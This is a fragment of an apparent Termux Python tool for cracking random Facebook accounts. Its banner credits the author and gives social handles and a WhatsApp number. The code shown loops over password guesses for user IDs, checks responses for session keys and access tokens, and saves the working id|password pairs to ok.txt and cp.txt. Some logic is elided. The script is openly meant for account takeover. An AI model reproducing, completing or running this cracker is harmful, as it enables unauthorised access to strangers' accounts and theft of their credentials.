...
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : Ali Raza XD  

\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : (AYAAN) Termux Commands 2023 

\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : Mahummad-Ayaan-404

\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : 03213915156
...
\033[1;90m══════════════════════════════════════════════════
    ...
    """)
		...
		print("%s [%s03%s]%s CRACK RANDOM FB ID 2004-5 %s (PRO) V3[Slow]"%(R,G,R,Y,G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			...
			"\r\r %s[>_] [RAZA-OLD] : %s/%s -> \033[0;92m [ R140N-OK:%s ]- \033[0;91m[R140N-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [RAZA-OK] %s|%s\n"%(uid, pw))
				...
				print("\r \033[0;91m[RAZA-CP] %s|%s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("cp.txt","a").write(" [RAZA-CP] %s|%s\n"%(uid, pw))
